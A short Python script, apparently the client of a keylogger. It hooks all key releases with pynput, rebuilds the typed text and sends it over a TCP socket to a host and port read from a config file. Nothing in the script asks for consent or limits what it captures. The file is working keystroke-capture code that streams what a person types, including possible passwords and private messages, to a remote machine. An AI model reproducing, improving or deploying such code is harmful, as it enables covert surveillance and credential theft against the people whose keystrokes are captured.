import os
from socket import socket as Socket

from pynput import keyboard

from config import ADDRESS, PORT

socket = Socket()
socket.connect((ADDRESS, PORT))

class Client:
    def __init__(self):
        self.text = ""

    def updateState(self, key):
        if hasattr(key, "char"):
            self.text += key.char
        elif key.name == "space":
            self.text += " "
        elif key.name == "backspace":
            self.text = self.text[:-1]
        elif key.name == "enter":
            self.text += "\n"
        else:
            return

        os.system("cls")
        print(self.text)
        socket.sendall(self.text.encode())

client = Client()
with keyboard.Listener(on_release=client.updateState) as listener:
    listener.join()
